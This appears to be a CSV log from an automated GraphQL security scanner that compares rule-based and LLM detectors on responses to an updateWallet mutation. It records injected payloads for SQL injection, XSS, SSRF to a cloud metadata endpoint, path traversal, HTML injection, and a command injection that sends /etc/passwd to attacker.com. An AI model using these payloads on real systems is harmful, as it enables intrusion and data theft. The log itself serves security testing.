timestamp,node_name,response_status,simple_count,llm_count,agreement_score,consensus,common_categories,simple_unique,llm_unique,simple_vulnerable_count,simple_potential_count,simple_safe_count,llm_vulnerable_count,llm_potential_count,llm_safe_count,potential_agreement_score,potential_consensus,common_potential_categories,simple_unique_potential,llm_unique_potential,simple_results,llm_results
2025-10-09T16:41:04.379348,updateWallet_response_2,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""SQL Injection (SQLi) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SQL injection vulnerability detected - malicious SQL patterns found in response"", ""evidence"": ""Response status: 200, SQL patterns detected in response""}]","[{""detection_name"": ""LLM: sql_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a SQL injection payload (`' OR 1=1--`) in the 'name' field. This payload is a classic SQL tautology test that could bypass logic in SQL WHERE clauses if unsanitized. While there's no explicit database error in the response, the acceptance and storage of this payload suggests insufficient input sanitization in GraphQL mutation handling. The presence of the single quote (`'`) and SQL comment syntax (`--`) in a persisted field indicates potential improper concatenation of user input into SQL queries."", ""evidence"": ""Injected payload `Test' OR 1=1--` in 'name' field returned in response"", ""confidence"": 0.7, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""sql_injection"", ""severity"": ""HIGH"", ""confidence"": 0.7, ""evidence"": ""Injected payload `Test' OR 1=1--` in 'name' field returned in response"", ""explanation"": ""The response contains a SQL injection payload (`' OR 1=1--`) in the 'name' field. This payload is a classic SQL tautology test that could bypass logic in SQL WHERE clauses if unsanitized. While there's no explicit database error in the response, the acceptance and storage of this payload suggests insufficient input sanitization in GraphQL mutation handling. The presence of the single quote (`'`) and SQL comment syntax (`--`) in a persisted field indicates potential improper concatenation of user input into SQL queries.""}}]"
2025-10-09T16:41:21.944686,updateWallet_response_3,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Cross-Site Scripting (XSS) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""XSS injection vulnerability detected - malicious script patterns found in response"", ""evidence"": ""Response status: 200, XSS patterns detected in response data""}]","[{""detection_name"": ""LLM: xss_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a stored XSS payload (<script>alert(document.cookie)</script>) in the 'name' field. This indicates user-supplied input was accepted and returned unencoded/sanitized. If this value is rendered in a browser context without proper escaping, it would execute arbitrary JavaScript and expose user cookies. While this requires confirmation of client-side rendering behavior, the presence of executable code in the response warrants classification as a vulnerability."", ""evidence"": ""\""name\"": \""<script>alert(document.cookie)</script>\"""", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""xss_injection"", ""severity"": ""HIGH"", ""confidence"": 0.95, ""evidence"": ""\""name\"": \""<script>alert(document.cookie)</script>\"""", ""explanation"": ""The response contains a stored XSS payload (<script>alert(document.cookie)</script>) in the 'name' field. This indicates user-supplied input was accepted and returned unencoded/sanitized. If this value is rendered in a browser context without proper escaping, it would execute arbitrary JavaScript and expose user cookies. While this requires confirmation of client-side rendering behavior, the presence of executable code in the response warrants classification as a vulnerability.""}}]"
2025-10-09T16:41:40.967600,updateWallet_response_4,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Server-Side Request Forgery (SSRF) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SSRF injection vulnerability detected - internal network access patterns found"", ""evidence"": ""Response status: 200, SSRF keywords detected in response""}]","[{""detection_name"": ""LLM: ssrf_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response includes the URL 'http://169.254.169.254/latest/meta-data', which is a well-known AWS metadata endpoint. This strongly suggests the server may have processed a user-controlled URL pointing to an internal cloud service. SSRF vulnerabilities allow attackers to force the server to make unauthorized internal requests, potentially exposing sensitive cloud metadata or internal systems. The presence of this URL in a GraphQL mutation response indicates a high likelihood of SSRF exploitation."", ""evidence"": ""http://169.254.169.254/latest/meta-data in the 'name' field"", ""confidence"": 0.8, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""ssrf_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.8, ""evidence"": ""http://169.254.169.254/latest/meta-data in the 'name' field"", ""explanation"": ""The response includes the URL 'http://169.254.169.254/latest/meta-data', which is a well-known AWS metadata endpoint. This strongly suggests the server may have processed a user-controlled URL pointing to an internal cloud service. SSRF vulnerabilities allow attackers to force the server to make unauthorized internal requests, potentially exposing sensitive cloud metadata or internal systems. The presence of this URL in a GraphQL mutation response indicates a high likelihood of SSRF exploitation.""}}]"
2025-10-09T16:41:54.170805,updateWallet_response_5,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: os_command_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The payload contains a command injection sequence: 1) Semicolon (;) terminates the current command, 2) curl executes an external HTTP request to attacker.com, 3) Command substitution $(cat /etc/passwd) attempts to read system files, 4) Hash (#) comments out residual code. This demonstrates clear attempt to execute arbitrary OS commands and exfiltrate sensitive system files via command substitution."", ""evidence"": ""name: \""; curl http://attacker.com/$(cat /etc/passwd) #\"""", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""os_command_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""name: \""; curl http://attacker.com/$(cat /etc/passwd) #\"""", ""explanation"": ""The payload contains a command injection sequence: 1) Semicolon (;) terminates the current command, 2) curl executes an external HTTP request to attacker.com, 3) Command substitution $(cat /etc/passwd) attempts to read system files, 4) Hash (#) comments out residual code. This demonstrates clear attempt to execute arbitrary OS commands and exfiltrate sensitive system files via command substitution.""}}]"
2025-10-09T16:42:09.135234,updateWallet_response_6,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Path Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""Path injection vulnerability detected - file system access patterns found"", ""evidence"": ""Response status: 200, Path injection patterns detected in response""}]","[{""detection_name"": ""LLM: path_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response shows a user-controlled input ('name') containing a directory traversal sequence ('../../../../etc/passwd'), which is a strong indicator of path injection. This suggests the application may be using unsanitized user input to construct file paths, potentially enabling unauthorized access to system files. While the 200 status code confirms the mutation was accepted, actual exploitation would require backend validation of file system operations, but the payload itself meets path injection criteria."", ""evidence"": ""name: \""../../../../etc/passwd\"" in updateWallet mutation response"", ""confidence"": 0.85, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""path_injection"", ""severity"": ""HIGH"", ""confidence"": 0.85, ""evidence"": ""name: \""../../../../etc/passwd\"" in updateWallet mutation response"", ""explanation"": ""The response shows a user-controlled input ('name') containing a directory traversal sequence ('../../../../etc/passwd'), which is a strong indicator of path injection. This suggests the application may be using unsanitized user input to construct file paths, potentially enabling unauthorized access to system files. While the 200 status code confirms the mutation was accepted, actual exploitation would require backend validation of file system operations, but the payload itself meets path injection criteria.""}}]"
2025-10-09T16:42:23.624577,updateWallet_response_7,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""HTML Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""HTML injection vulnerability detected - HTML markup found in response"", ""evidence"": ""Response status: 200, HTML patterns detected in response data""}]","[{""detection_name"": ""LLM: html_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains unsanitized user-controlled HTML content (`<img src='x' onerror='alert(1)>`) in the 'name' field of the 'updateWallet' object. This demonstrates that the application does not properly sanitize user input when returning it in responses. If this value is rendered directly in a browser, it would execute JavaScript (XSS), indicating HTML injection vulnerability via improper output encoding/sanitization."", ""evidence"": ""<img src='x' onerror='alert(1)'> in the 'name' field"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""html_injection"", ""severity"": ""HIGH"", ""confidence"": 0.95, ""evidence"": ""<img src='x' onerror='alert(1)'> in the 'name' field"", ""explanation"": ""The response contains unsanitized user-controlled HTML content (`<img src='x' onerror='alert(1)>`) in the 'name' field of the 'updateWallet' object. This demonstrates that the application does not properly sanitize user input when returning it in responses. If this value is rendered directly in a browser, it would execute JavaScript (XSS), indicating HTML injection vulnerability via improper output encoding/sanitization.""}}]"
2025-10-09T16:42:48.912610,updateWallet_response_8,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-09T16:43:07.727595,updateWallet_response_9,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-09T16:44:27.372961,updateWallet_response_10,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-09T16:44:47.875134,updateWallet_response_11,400,1,1,0.0,both_detected,,Information Disclosure,Unknown,1,0,0,0,1,0,0.0,llm_potential_only,,,Unknown,"[{""detection_name"": ""Field Suggestions Enabled"", ""detection"": ""vulnerable"", ""category"": ""Information Disclosure"", ""description"": ""Field suggestions enabled - potential information disclosure"", ""evidence"": ""Found \""did you mean\"" in error message - field suggestions are enabled""}]","[{""detection_name"": ""LLM: field_suggestions"", ""detection"": ""potential"", ""category"": ""Unknown"", ""description"": ""The server's error response explicitly suggests valid field names ('balance' and 'currency') when typos are detected in the query. This constitutes an information disclosure vulnerability (field_suggestions) as it reveals schema details that could aid attackers in reconnaissance. While not critical, this lowers the barrier for attackers to probe and exploit the API by exposing valid field names through error messages."", ""evidence"": ""Did you mean \""balance\""?, Did you mean \""currency\""?"", ""confidence"": 1.0, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""field_suggestions"", ""severity"": ""MEDIUM"", ""confidence"": 1.0, ""evidence"": ""Did you mean \""balance\""?, Did you mean \""currency\""?"", ""explanation"": ""The server's error response explicitly suggests valid field names ('balance' and 'currency') when typos are detected in the query. This constitutes an information disclosure vulnerability (field_suggestions) as it reveals schema details that could aid attackers in reconnaissance. While not critical, this lowers the barrier for attackers to probe and exploit the API by exposing valid field names through error messages.""}}]"
